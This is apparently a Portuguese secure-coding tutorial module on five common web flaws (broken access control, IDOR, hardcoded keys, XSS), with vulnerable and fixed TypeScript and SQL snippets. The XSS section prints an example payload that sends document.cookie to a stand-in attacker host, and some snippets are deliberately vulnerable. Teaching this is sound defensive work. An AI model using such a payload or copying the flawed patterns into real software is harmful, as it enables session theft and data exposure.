# 02. As cinco falhas que mais aparecem em projeto real

## O que eu preciso saber daqui

Quase todo vazamento que eu vejo em projeto pequeno cai em uma de cinco
falhas. Nenhuma é difícil de corrigir, e todas têm a mesma raiz: **confiar no
que vem do navegador**. O navegador é do usuário. Qualquer coisa que ele manda
(ID, papel, preço, HTML) pode ter sido editada.

| # | Falha | Classificação |
|---|---|---|
| 1 | Banco sem tranca | [OWASP A01:2021](https://top10.owasp.org/2021/A01_2021-Broken_Access_Control/) (controle de acesso quebrado) |
| 2 | Permissão só no navegador | OWASP A01:2021 |
| 3 | IDOR | OWASP A01:2021, CWE-639 |
| 4 | Chave no código | CWE-798 |
| 5 | Entrada sem tratamento (XSS) | [OWASP A03:2021](https://top10.owasp.org/2021/A03_2021-Injection/) (injeção), CWE-79 |

Os exemplos são em TypeScript com Express e SQL de PostgreSQL, mas a ideia vale
para qualquer stack.

---

## 1. Banco sem tranca

**O que é:** uma consulta de listagem que não filtra pelo dono. Todo usuário
logado vê os dados de todos.

```ts
// VULNERÁVEL: devolve os pedidos de todo mundo
app.get("/pedidos", exigeLogin, async (req, res) => {
  const pedidos = await db.query("select * from pedidos");
  res.json(pedidos.rows);
});
```

```ts
// CORRIGIDO: o filtro usa o usuário da sessão, nunca um parâmetro da requisição
app.get("/pedidos", exigeLogin, async (req, res) => {
  const pedidos = await db.query("select * from pedidos where user_id = $1", [req.user.id]);
  res.json(pedidos.rows);
});
```

O problema de filtrar à mão é esquecer em uma rota. Em PostgreSQL (e no
Supabase), o **RLS** coloca a regra no próprio banco, e aí nenhuma consulta
escapa:

```sql
alter table pedidos enable row level security;

create policy "cada um vê os seus" on pedidos
  for select using (user_id = auth.uid());
```

Tabela com RLS ligado e **sem nenhuma política** não devolve nada para
ninguém, o que é o comportamento seguro. O perigo é o contrário: RLS desligado.

---

## 2. Permissão só no navegador

**O que é:** o frontend esconde o botão de admin, mas a rota aceita qualquer um.

```tsx
// O frontend esconde o botão...
{usuario.papel === "admin" && <button onClick={apagarUsuario}>Apagar</button>}
```

```ts
// ...mas a API não confere. Basta chamar a rota direto (curl, DevTools).
app.delete("/usuarios/:id", exigeLogin, async (req, res) => {
  await db.query("delete from usuarios where id = $1", [req.params.id]);
  res.sendStatus(204);
});
```

```ts
// CORRIGIDO: o papel vem do banco, conferido no servidor, em toda rota sensível
app.delete("/usuarios/:id", exigeLogin, exigePapel("admin"), async (req, res) => {
  await db.query("delete from usuarios where id = $1", [req.params.id]);
  res.sendStatus(204);
});
```

Esconder o botão é experiência de uso, não segurança. E o papel nunca pode vir
de algo que o usuário controla, como um campo no corpo da requisição ou um dado
salvo no `localStorage`.

---

## 3. IDOR (referência direta a objeto)

**O que é:** a rota busca pelo ID que veio na URL e não confere se o objeto é
de quem pediu. Trocar `/faturas/41` por `/faturas/42` mostra a fatura de outra
pessoa.

```ts
// VULNERÁVEL
app.get("/faturas/:id", exigeLogin, async (req, res) => {
  const r = await db.query("select * from faturas where id = $1", [req.params.id]);
  res.json(r.rows[0]);
});
```

```ts
// CORRIGIDO: o dono entra na própria consulta
app.get("/faturas/:id", exigeLogin, async (req, res) => {
  const r = await db.query("select * from faturas where id = $1 and user_id = $2", [req.params.id, req.user.id]);
  if (!r.rows[0]) return res.sendStatus(404); // 404, não 403: não confirma que o ID existe
  res.json(r.rows[0]);
});
```

Usar UUID no lugar de número sequencial dificulta adivinhar, mas **não
corrige**. O ID vaza em link compartilhado, log e print. A correção é conferir
o dono.

---

## 4. Chave no código

**O que é:** segredo escrito direto no código, no `docker-compose.yml`, no CI ou
na documentação.

```ts
// VULNERÁVEL
const stripe = new Stripe("sk_live_51H...");
```

```ts
// CORRIGIDO: vem do ambiente, validado na subida (veja o módulo 01)
const stripe = new Stripe(env.STRIPE_SECRET_KEY);
```

Onde procurar além do código: histórico do git (`git log -p`), arquivos de CI,
`docker-compose.yml` com `${VAR:-valor}`, e o JavaScript que vai para o
navegador. Detalhes no [módulo 01](../01-segredos-e-env/README.md).

---

## 5. Entrada sem tratamento (XSS)

**O que é:** texto do usuário vira HTML na página de outra pessoa. Um
comentário com `<img src=x onerror="fetch('https://atacante.com?c='+document.cookie)">`
roda no navegador de quem abrir.

```tsx
// VULNERÁVEL: o React escapa texto por padrão, mas esta porta desliga a proteção
<div dangerouslySetInnerHTML={{ __html: comentario.texto }} />
```

```tsx
// CORRIGIDO na maioria dos casos: renderizar como texto
<div>{comentario.texto}</div>
```

Se precisar mesmo de HTML (editor de texto rico, markdown), sanitize com uma
biblioteca feita para isso, como o
[DOMPurify](https://github.com/cure53/DOMPurify), e nunca com regex caseira.

Outras portas para a mesma falha:

- `innerHTML` em JavaScript puro, `v-html` no Vue, `[innerHTML]` no Angular;
- link com URL do usuário: `<a href={perfil.site}>` aceita
  `javascript:alert(1)`. Só permita `http:` e `https:`;
- `eval` e `new Function` com qualquer coisa vinda de fora;
- texto do usuário entrando no HTML de um e-mail sem escape.

---

## Como eu reviso um projeto atrás dessas cinco

1. Descubro qual é o mecanismo de isolamento (RLS, filtro por `user_id`,
   middleware de organização) e confiro se **toda** tabela ou rota usa.
2. Para cada botão escondido por papel no frontend, acho a rota correspondente
   e confiro se o servidor também valida.
3. Percorro **todas** as rotas que recebem ID, não uma amostra.
4. Rodo o gitleaks no histórico e procuro `:-` em arquivos de deploy.
5. Procuro `dangerouslySetInnerHTML`, `innerHTML`, `v-html`, `eval` e `href`
   com dado do usuário.

E anoto também o que está **certo**. Saber o que já está protegido é metade da
revisão.

## O que costuma confundir no começo

- "Mas o usuário não sabe o ID." Sabe. Está na URL, na resposta da API e no
  DevTools.
- "Validei no formulário." Validação no frontend ajuda o usuário a não errar;
  quem quer atacar pula o formulário e chama a API direto.
- "O React protege de XSS." Protege, até alguém usar `dangerouslySetInnerHTML`.
